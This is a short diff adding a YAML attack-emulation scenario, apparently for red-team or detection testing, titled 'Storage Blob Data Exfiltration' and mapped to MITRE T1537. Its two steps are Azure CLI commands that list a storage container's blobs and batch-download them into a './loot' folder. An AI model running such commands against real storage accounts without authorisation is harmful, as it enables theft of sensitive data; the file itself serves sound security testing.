@@ -1,0 +1,9 @@
+name: Storage Blob Data Exfiltration
+description: Storage Blob Data Exfiltration
+mitre_technique: T1537
+stage: Collection
+steps:
+- action: az storage blob list --account-name mystorage --container-name data
+  description: List sensitive blobs
+- action: az storage blob download-batch -d ./loot -s data
+  description: Download data
